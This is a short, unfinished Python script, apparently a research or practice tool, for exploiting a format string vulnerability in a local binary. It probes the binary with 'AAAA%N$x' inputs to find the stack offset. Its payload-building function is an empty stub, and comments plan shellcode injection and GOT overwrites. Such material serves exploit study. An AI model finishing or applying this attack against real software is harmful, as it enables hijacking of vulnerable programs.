import os
from subprocess import Popen,PIPE,call

def executeProgram(binaryName, formatString):
	return Popen([binaryName, formatString],stdout=PIPE,close_fds=True).communicate()[0].strip()

def parseAddressSpace(binaryName):
	return Popen(["gdb", "-q", binaryName],stdout=PIPE,close_fds=True).communicate()[0].strip()

def calculateOffset(binaryName, formatString):
	output = "";
	arg = 1;	
	
	while(1):

		if(arg>50):
			return -1;		

		format =  formatString + "%" + str(arg) + "$x";		
		output = executeProgram(binaryName,format);

		if( formatString+"41414141" in output):
			print("Offset between format string and its address is: %d words" % arg);
			print("Format string used: %s" % format);
			return arg;

		arg = arg + 1;


def prepareFormatString(addressToWrite, addressToOverwrite, distanceInWords):
	return -1;

# Write function which exports custom/default shell code and returns its address
# Write function which shows the addresses of GOT entries which can be overwritten


def main():

	binaryName = "/home/prateekj/Desktop/Research/problem1";	

	# Find vulnerable printf
	parseAddressSpace(binaryName);
	
	# Find Offset 
	r = calculateOffset(binaryName, "AAAA");	
	if(r == -1):
		r1 = calculateOffset(binaryName, "AAAAA");
		if(r1 == -1):
			print("Cannot find offset");


if __name__ == '__main__':
	main()
